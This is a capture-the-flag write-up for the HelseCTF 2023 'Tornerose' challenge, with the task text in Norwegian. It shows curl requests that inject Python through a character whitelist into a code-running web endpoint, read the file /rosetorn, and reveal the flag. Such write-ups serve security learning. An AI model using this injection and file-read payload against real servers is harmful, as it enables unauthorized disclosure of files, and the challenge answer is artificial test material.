# Tornerose (500)

Nestor Roe er veldig glad i fortellingen om Tornerose. Når dagen går litt dårlig sender han ofte følgende Python-program til webserveren sin for å bli litt glad igjen:

print("tornerose/prins")
Programmet kjøres ved å bruke en GET-request, slik som dette:

https://helsectf2023-6ac4e1c6d8855c1bd96a-tornerose.chals.io/?program=print("tornerose/prins")
Responsen er output av Python-programmet som sendes inn: tornerose/prins

Han har hvitelista kun de 12 forskjellige tegnende som programmet består av, einoprst"/(), slik at ingen skal kunne kjøre noe utilsiktet kode på serveren. Men det er en torn i siden på hvitelistinga.

Kan du lese flagget som ligger i fila /rosetorn?

https://helsectf2023-6ac4e1c6d8855c1bd96a-tornerose.chals.io/

# Solution

```
einoprst"/()
```

Curling a lot of functions here. This is what I had until a friend of me came with a tip.

```
$ curl "https://helsectf2023-6ac4e1c6d8855c1bd96a-tornerose.chals.io/?program=print(open(\"/rosetorn\"))"
<_io.TextIOWrapper name='/rosetorn' mode='r' encoding='UTF-8'>
```

To wrap that TextIOWrapper in a "set" 

Doing that gave me the flag:

```
$ curl "https://helsectf2023-6ac4e1c6d8855c1bd96a-tornerose.chals.io/?program=print(set(open(\"/rosetorn\")))"
{'helsectf{og_h4cken_vokste_kjempeh0y}\n'}
```

# Flag

```
helsectf{og_h4cken_vokste_kjempeh0y}
```